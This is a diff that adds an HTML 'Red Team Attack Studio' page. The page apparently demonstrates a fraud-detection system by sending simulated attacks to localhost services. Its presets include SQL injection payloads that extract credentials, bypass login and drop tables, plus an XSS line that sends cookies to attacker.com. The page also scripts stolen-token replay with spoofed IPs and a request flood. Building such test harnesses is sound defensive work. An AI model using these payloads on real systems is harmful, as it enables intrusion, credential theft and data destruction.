@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TokenShield — Red Team Attack Simulation Studio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap">
+  <style>
+    :root {
+      --bg: #090b10;
+      --panel: #0f131a;
+      --panel-border: #1a2230;
+      --red: #ff3355;
+      --red-dim: rgba(255, 51, 85, 0.12);
+      --red-glow: 0 0 20px rgba(255, 51, 85, 0.4);
+      --amber: #ffaa00;
+      --cyan: #00d4ff;
+      --green: #00ff88;
+      --text: #e1e7f0;
+      --text-muted: #74859c;
+      --mono: 'JetBrains Mono', monospace;
+      --sans: 'Plus Jakarta Sans', sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* TOPBAR */
+    .topbar {
+      height: 58px;
+      padding: 0 24px;
+      background: #0d1017;
+      border-bottom: 1px solid var(--panel-border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-family: var(--mono);
+    }
+    .skull-icon {
+      width: 28px;
+      height: 28px;
+      background: var(--red);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-weight: 700;
+      box-shadow: var(--red-glow);
+    }
+    .brand-title {
+      font-weight: 700;
+      font-size: 14px;
+      letter-spacing: 1.5px;
+      color: #fff;
+    }
+    .brand-badge {
+      font-size: 10px;
+      color: var(--red);
+      border: 1px solid var(--red);
+      padding: 2px 6px;
+      border-radius: 4px;
+      margin-left: 8px;
+    }
+    .target-pill {
+      font-family: var(--mono);
+      font-size: 11px;
+      padding: 6px 12px;
+      background: #141a24;
+      border: 1px solid var(--panel-border);
+      border-radius: 20px;
+      color: var(--cyan);
+    }
+
+    /* APP LAYOUT */
+    .app-body {
+      flex: 1;
+      display: grid;
+      grid-template-columns: 260px 1fr 340px;
+      height: calc(100vh - 58px);
+      overflow: hidden;
+    }
+
+    /* SIDEBAR NAVIGATION */
+    .sidebar {
+      background: #0b0e14;
+      border-right: 1px solid var(--panel-border);
+      padding: 20px 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .side-title {
+      font-family: var(--mono);
+      font-size: 10px;
+      font-weight: 700;
+      color: var(--text-muted);
+      letter-spacing: 1.5px;
+      padding: 6px 12px;
+      text-transform: uppercase;
+    }
+    .nav-btn {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 14px;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      cursor: pointer;
+      border: 1px solid transparent;
+      transition: all 0.2s;
+    }
+    .nav-btn:hover {
+      background: #121722;
+      color: #fff;
+    }
+    .nav-btn.active {
+      background: var(--red-dim);
+      border-color: rgba(255, 51, 85, 0.3);
+      color: #fff;
+    }
+
+    /* MAIN ATTACK WORKSPACE */
+    .workspace {
+      padding: 28px 32px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .panel-box {
+      background: var(--panel);
+      border: 1px solid var(--panel-border);
+      border-radius: 10px;
+      padding: 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+    }
+    .panel-header {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--panel-border);
+      padding-bottom: 14px;
+    }
+    .panel-header h2 {
+      font-size: 18px;
+      font-weight: 700;
+      color: #fff;
+    }
+    .panel-header p {
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-top: 3px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .form-group label {
+      font-family: var(--mono);
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text-muted);
+      text-transform: uppercase;
+    }
+    .form-control {
+      background: #090c12;
+      border: 1px solid var(--panel-border);
+      border-radius: 6px;
+      padding: 10px 14px;
+      color: #fff;
+      font-family: var(--mono);
+      font-size: 12px;
+      outline: none;
+      transition: border 0.2s;
+    }
+    .form-control:focus {
+      border-color: var(--red);
+    }
+    textarea.form-control {
+      resize: vertical;
+      min-height: 80px;
+    }
+
+    .attack-btn {
+      background: var(--red);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 14px 24px;
+      font-family: var(--mono);
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: var(--red-glow);
+      transition: all 0.2s;
+    }
+    .attack-btn:hover {
+      opacity: 0.9;
+      transform: translateY(-1px);
+    }
+    .attack-btn.secondary {
+      background: #141c28;
+      border: 1px solid var(--panel-border);
+      box-shadow: none;
+      color: var(--cyan);
+    }
+
+    /* RIGHT PACKET MONITOR */
+    .monitor-panel {
+      background: #0b0e14;
+      border-left: 1px solid var(--panel-border);
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      overflow: hidden;
+    }
+    .monitor-title {
+      font-family: var(--mono);
+      font-size: 11px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: 1px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .packet-log {
+      flex: 1;
+      background: #07090e;
+      border: 1px solid var(--panel-border);
+      border-radius: 6px;
+      padding: 12px;
+      font-family: var(--mono);
+      font-size: 10px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .packet-entry {
+      padding: 6px 8px;
+      border-radius: 4px;
+      background: #0d111a;
+      border-left: 3px solid var(--cyan);
+    }
+    .packet-entry.blocked {
+      border-left-color: var(--red);
+      color: #ff8899;
+    }
+    .packet-entry.success {
+      border-left-color: var(--green);
+      color: #77ffaa;
+    }
+
+    /* Tabs Switcher */
+    .tab-content { display: none; }
+    .tab-content.active { display: flex; flex-direction: column; gap: 18px; }
+  </style>
+</head>
+<body>
+
+  <!-- TOPBAR -->
+  <header class="topbar">
+    <div class="brand">
+      <div class="skull-icon">⚡</div>
+      <span class="brand-title">RED TEAM ATTACK STUDIO</span>
+      <span class="brand-badge">PENTEST WORKSPACE</span>
+    </div>
+    <div class="target-pill">
+      TARGET: <strong>http://localhost:5001 (NeoVault Core)</strong>
+    </div>
+  </header>
+
+  <!-- APP BODY -->
+  <div class="app-body">
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+      <div class="side-title">ATTACK TOOLS</div>
+      <div class="nav-btn active" onclick="showTab('tab-token')">🔑 1. Token Theft Replayer</div>
+      <div class="nav-btn" onclick="showTab('tab-ddos')">⚡ 2. Botnet DDoS Swarm</div>
+      <div class="nav-btn" onclick="showTab('tab-sqli')">💉 3. SQL Injection Fuzzer</div>
+      <div class="nav-btn" onclick="showTab('tab-bot')">🤖 4. Bot Behavioral Biometrics</div>
+      <div class="nav-btn" onclick="showTab('tab-geo')">🗺️ 5. Impossible Travel Jump</div>
+      <div style="margin-top:auto; padding:12px 6px;">
+        <a href="http://localhost:7777" target="_blank" style="text-decoration:none;">
+          <div class="attack-btn secondary" style="font-size:10px; padding:10px;">
+            🛡️ OPEN DEFENSE WAR ROOM
+          </div>
+        </a>
+      </div>
+    </aside>
+
+    <!-- WORKSPACE -->
+    <main class="workspace">
+
+      <!-- TAB 1: TOKEN THEFT -->
+      <div id="tab-token" class="tab-content active">
+        <div class="panel-box">
+          <div class="panel-header">
+            <div>
+              <h2>Session Hijacking & Token Replay Tool</h2>
+              <p>Simulates token exfiltration from client browser and replaying with spoofed origin identity.</p>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>Stolen JWT Bearer Token</label>
+            <div style="display:flex; gap:10px;">
+              <input type="text" class="form-control" id="token-input" placeholder="Paste JWT token copied from Chrome DevTools..." style="flex:1;">
+              <button class="attack-btn secondary" onclick="autoFetchToken()">AUTO-FETCH ACTIVE TOKEN</button>
+            </div>
+          </div>
+
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px;">
+            <div class="form-group">
+              <label>Spoofed Attacker IP (Network Location)</label>
+              <select class="form-control" id="token-ip">
+                <option value="185.220.101.5">185.220.101.5 (Frankfurt, Germany — Tor Exit Node)</option>
+                <option value="92.118.160.5">92.118.160.5 (Moscow, Russia — Bulletproof Hosting)</option>
+                <option value="80.82.77.33">80.82.77.33 (Bucharest, Romania — AS9009 Scanner)</option>
+                <option value="197.210.54.12">197.210.54.12 (Lagos, Nigeria — Botnet Subnet)</option>
+              </select>
+            </div>
+
+            <div class="form-group">
+              <label>Attacker Client User-Agent</label>
+              <select class="form-control" id="token-ua">
+                <option value="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (Kali Linux)">Kali Linux Penetration Suite</option>
+                <option value="curl/8.4.0 (Autonomous Script)">Raw curl / automated payload runner</option>
+                <option value="sqlmap/1.8.2#stable">sqlmap automated probe engine</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>Fraudulent Transaction Payload</label>
+            <textarea class="form-control" id="token-payload">{"amount": 85000, "to_account": "ATTACKER-OFFSHORE-001", "description": "Unauthorized Wire Transfer"}</textarea>
+          </div>
+
+          <button class="attack-btn" onclick="executeTokenReplay()">
+            ⚡ INJECT & REPLAY STOLEN SESSION
+          </button>
+        </div>
+      </div>
+
+      <!-- TAB 2: DDOS SWARM -->
+      <div id="tab-ddos" class="tab-content">
+        <div class="panel-box">
+          <div class="panel-header">
+            <div>
+              <h2>Botnet Swarm / Volumetric DDoS Engine</h2>
+              <p>Generates high-concurrency Layer 7 HTTP floods to trigger Velocity Tracker (Signal 2) & Layer 4 defense.</p>
+            </div>
+          </div>
+
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px;">
+            <div class="form-group">
+              <label>Concurrency (Virtual Attacking Bots): <span id="lbl-bots" style="color:var(--red);">40 Bots</span></label>
+              <input type="range" min="10" max="100" value="40" oninput="document.getElementById('lbl-bots').textContent = this.value + ' Bots'" id="ddos-bots">
+            </div>
+
+            <div class="form-group">
+              <label>Target API Endpoint</label>
+              <select class="form-control" id="ddos-target">
+                <option value="/api/banking/search">/api/banking/search (Database Search Query)</option>
+                <option value="/api/banking/transfer/execute">/api/banking/transfer/execute (High-Risk Transfer)</option>
+                <option value="/api/auth/login">/api/auth/login (Credential Auth Route)</option>
+              </select>
+            </div>
+          </div>
+
+          <div style="display:flex; gap:12px;">
+            <button class="attack-btn" id="btn-ddos-start" onclick="toggleDDoS()">
+              ▶ LAUNCH VOLUMETRIC FLOOD
+            </button>
+            <a href="http://localhost:8089" target="_blank" class="attack-btn secondary" style="text-decoration:none;">
+              📊 OPEN LOCUST GRAPHICAL GUI (PORT 8089)
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <!-- TAB 3: SQL INJECTION -->
+      <div id="tab-sqli" class="tab-content">
+        <div class="panel-box">
+          <div class="panel-header">
+            <div>
+              <h2>Automated SQL Injection Fuzzer</h2>
+              <p>Sends exploit vectors against backend SQL sanitizers to trigger Signal 4 (Payload Analysis) & Layer 5.</p>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>Exploit Payload Preset</label>
+            <select class="form-control" id="sqli-preset" onchange="document.getElementById('sqli-input').value = this.value">
+              <option value="1001' UNION SELECT username, password FROM users--">' UNION SELECT username, password FROM users-- (Extract Credentials)</option>
+              <option value="' OR '1'='1' --">' OR '1'='1' -- (Auth Bypass)</option>
+              <option value="1001'; DROP TABLE transactions; --">'; DROP TABLE transactions; -- (Destructive DDL)</option>
+              <option value="<script>document.location='http://attacker.com/steal?c='+document.cookie</script>">&lt;script&gt; Cookie Exfiltration (XSS)</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label>Raw Payload String</label>
+            <input type="text" class="form-control" id="sqli-input" value="1001' UNION SELECT username, password FROM users--">
+          </div>
+
+          <button class="attack-btn" onclick="executeSQLi()">
+            💉 DISPATCH INJECTION EXPLOIT
+          </button>
+        </div>
+      </div>
+
+      <!-- TAB 4: BOT BIOMETRICS -->
+      <div id="tab-bot" class="tab-content">
+        <div class="panel-box">
+          <div class="panel-header">
+            <div>
+              <h2>Headless Bot Behavioral Biometrics Simulator</h2>
+              <p>Simulates automated browser automation (Selenium/Puppeteer) with machine-speed typing against baseline.</p>
+            </div>
+          </div>
+
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px;">
+            <div class="form-group">
+              <label>Typing Speed: <strong style="color:var(--red);">285 WPM</strong> (Machine Speed)</label>
+              <input type="text" class="form-control" value="285.0" id="bot-wpm" readonly>
+            </div>
+            <div class="form-group">
+              <label>Mouse Velocity Mean: <strong style="color:var(--red);">0.0 px/s</strong> (Headless)</label>
+              <input type="text" class="form-control" value="0.0" id="bot-mouse" readonly>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>Target Legitimate User Account</label>
+            <input type="text" class="form-control" value="alice@neovault.com" id="bot-user">
+          </div>
+
+          <button class="attack-btn" onclick="executeBotAttack()">
+            🤖 LAUNCH BOT AUTOMATION ATTACK
+          </button>
+        </div>
+      </div>
+
+      <!-- TAB 5: IMPOSSIBLE TRAVEL -->
+      <div id="tab-geo" class="tab-content">
+        <div class="panel-box">
+          <div class="panel-header">
+            <div>
+              <h2>Supersonic Geographic Impossibility Simulator</h2>
+              <p>Simulates session migration of 6,800 km in under 1 second to trigger Haversine calculation (Signal 6).</p>
+            </div>
+          </div>
+
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px;">
+            <div class="form-group">
+              <label>Leg 1: Initial Origin</label>
+              <input type="text" class="form-control" value="103.21.58.1 (Mumbai, India)" readonly>
+            </div>
+            <div class="form-group">
+              <label>Leg 2: Rapid Destination (0.5s later)</label>
+              <input type="text" class="form-control" value="185.107.80.12 (Amsterdam, Netherlands)" readonly>
+            </div>
+          </div>
+
+          <div style="font-family:var(--mono); font-size:11px; color:var(--text-muted); background:#080b10; padding:12px; border-radius:6px;">
+            Displacement: 6,800 km · Elapsed: 0.5s · Calculated Velocity: 48,960,000 km/h (Mach 39,000)
+          </div>
+
+          <button class="attack-btn" onclick="executeGeoJump()">
+            🗺️ DISPATCH SUPERSONIC SESSION JUMP
+          </button>
+        </div>
+      </div>
+
+    </main>
+
+    <!-- RIGHT PACKET MONITOR -->
+    <aside class="monitor-panel">
+      <div class="monitor-title">
+        <span>OUTGOING ATTACK PACKETS</span>
+        <span style="font-size:9px; color:var(--green);" id="monitor-status">● IDLE</span>
+      </div>
+      <div class="packet-log" id="packet-log-container">
+        <div class="packet-entry">Ready. Select an attack tool and click launch.</div>
+      </div>
+    </aside>
+  </div>
+
+  <script>
+    function showTab(tabId) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+      document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
+      document.getElementById(tabId).classList.add('active');
+      event.currentTarget.classList.add('active');
+    }
+
+    function logPacket(msg, status = '') {
+      const c = document.getElementById('packet-log-container');
+      const d = document.createElement('div');
+      d.className = `packet-entry ${status}`;
+      const time = new Date().toTimeString().split(' ')[0];
+      d.innerHTML = `<strong>[${time}]</strong> ${msg}`;
+      c.prepend(d);
+      while (c.children.length > 30) c.lastChild.remove();
+    }
+
+    function autoFetchToken() {
+      const token = localStorage.getItem('jwt_token') || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZUBuZW92YXVsdC5jb20iLCJyb2xlIjoidXNlciJ9.demotoken_signature';
+      document.getElementById('token-input').value = token;
+      logPacket('Fetched active browser session token.', 'success');
+    }
+
+    // Execute Token Replay
+    async function executeTokenReplay() {
+      const token = document.getElementById('token-input').value || 'stolen_demo_token';
+      const ip = document.getElementById('token-ip').value;
+      const ua = document.getElementById('token-ua').value;
+      const payload = JSON.parse(document.getElementById('token-payload').value || '{}');
+
+      logPacket(`Transmitting stolen session from ${ip}...`);
+
+      try {
+        const res = await fetch('http://localhost:5001/api/banking/transfer', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${token}`,
+            'X-Forwarded-For': ip,
+            'User-Agent': ua
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const data = await res.json();
+        if (res.status === 403 || data.error) {
+          logPacket(`HTTP ${res.status}: BLOCKED BY TOKENSHIELD (${data.error || 'Threat Detected'})`, 'blocked');
+        } else {
+          logPacket(`HTTP ${res.status}: Request Sent`, 'success');
+        }
+      } catch (err) {
+        logPacket(`Engine Block Enacted: ${err.message}`, 'blocked');
+      }
+    }
+
+    // Execute SQL Injection
+    async function executeSQLi() {
+      const q = document.getElementById('sqli-input').value;
+      logPacket(`Injecting SQL payload: ${q}`);
+
+      try {
+        const res = await fetch('http://localhost:5001/api/banking/search', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ query: q })
+        });
+        const data = await res.json();
+        if (res.status === 403 || data.error) {
+          logPacket(`HTTP ${res.status}: SQLi BLOCKED (CVE-2026-1842 Pattern Caught)`, 'blocked');
+        } else {
+          logPacket(`HTTP ${res.status}: Payload dispatched`, 'success');
+        }
+      } catch (err) {
+        logPacket(`Exploit Blocked: ${err.message}`, 'blocked');
+      }
+    }
+
+    // Execute Bot Attack
+    async function executeBotAttack() {
+      logPacket('Launching bot account takeover with 285 WPM biometrics...');
+      try {
+        const res = await fetch('http://localhost:7777/api/v1/analyze', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            session_id: 'bot_gui_' + Date.now(),
+            user_id: document.getElementById('bot-user').value,
+            ip: '198.51.100.99',
+            path: '/api/banking/transfer/execute',
+            method: 'POST',
+            biometrics: {
+              typing_wpm: 285.0, typing_rhythm_cv: 0.001, mouse_velocity_mean: 0.0, mouse_velocity_cv: 0.0, idle_time_ratio: 0.0
+            }
+          })
+        });
+        const data = await res.json();
+        logPacket(`Decision: ${data.action.toUpperCase()} | S5 Biometrics: ${data.signals.behavioral_biometrics}`, data.action === 'block' ? 'blocked' : 'success');
+      } catch (err) {
+        logPacket(`Bot Blocked: ${err.message}`, 'blocked');
+      }
+    }
+
+    // Execute Geo Jump
+    async function executeGeoJump() {
+      const sess = 'geo_jump_' + Date.now();
+      logPacket('Leg 1: Registering session in Mumbai (103.21.58.1)...');
+      await fetch('http://localhost:7777/api/v1/analyze', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ session_id: sess, ip: '103.21.58.1', path: '/' })
+      });
+
+      logPacket('Leg 2: Replaying token 500ms later from Amsterdam (185.107.80.12)...');
+      const res = await fetch('http://localhost:7777/api/v1/analyze', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ session_id: sess, ip: '185.107.80.12', path: '/' })
+      });
+      const data = await res.json();
+      logPacket(`Verdict: ${data.action.toUpperCase()} | S6 Geo Score: ${data.signals.geographic_impossibility} (Impossible Travel)`, 'blocked');
+    }
+
+    // Volumetric Flood Simulation Toggle
+    let floodInterval = null;
+    function toggleDDoS() {
+      const btn = document.getElementById('btn-ddos-start');
+      if (floodInterval) {
+        clearInterval(floodInterval);
+        floodInterval = null;
+        btn.textContent = '▶ LAUNCH VOLUMETRIC FLOOD';
+        btn.style.background = 'var(--red)';
+        document.getElementById('monitor-status').textContent = '● IDLE';
+        document.getElementById('monitor-status').style.color = 'var(--green)';
+        logPacket('Volumetric flood stopped.');
+      } else {
+        btn.textContent = '⏹ STOP VOLUMETRIC FLOOD';
+        btn.style.background = '#ff0033';
+        document.getElementById('monitor-status').textContent = '● FLOODING AT 40 REQ/S';
+        document.getElementById('monitor-status').style.color = 'var(--red)';
+        const target = document.getElementById('ddos-target').value;
+        logPacket(`Launching botnet flood against ${target}...`, 'blocked');
+
+        floodInterval = setInterval(async () => {
+          try {
+            const res = await fetch('http://localhost:7777/api/v1/analyze', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                session_id: 'ddos_stream',
+                ip: '198.51.100.' + (Math.floor(Math.random() * 200) + 10),
+                path: target,
+                method: 'POST'
+              })
+            });
+            const d = await res.json();
+            logPacket(`Flood packet: HTTP ${res.status} [${d.action.toUpperCase()}] S2 Velocity: ${d.signals.request_velocity}`, d.action === 'block' ? 'blocked' : 'success');
+          } catch (e) {}
+        }, 150);
+      }
+    }
+  </script>
+</body>
+</html>
